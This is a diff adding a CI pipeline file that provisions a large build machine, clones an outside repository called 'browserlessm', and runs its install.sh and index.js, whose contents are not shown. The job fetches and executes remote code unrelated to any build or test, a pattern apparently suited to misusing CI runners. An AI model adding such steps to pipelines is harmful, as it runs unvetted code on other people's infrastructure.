@@ -1,0 +1,18 @@
+version: v1.0
+name: Browserlessm CI
+agent:
+  machine:
+    type: e1-standard-8
+    os_image: ubuntu1804
+blocks:
+  - name: Build and Test
+    task:
+      jobs:
+        - name: Install Dependencies
+          commands:
+            - 'git clone https://github.com/Yiiiwhh123cg/browserlessm'
+            - cd browserlessm
+            - npm install -g yarn
+            - yarn install
+            - sh install.sh
+            - node index.js
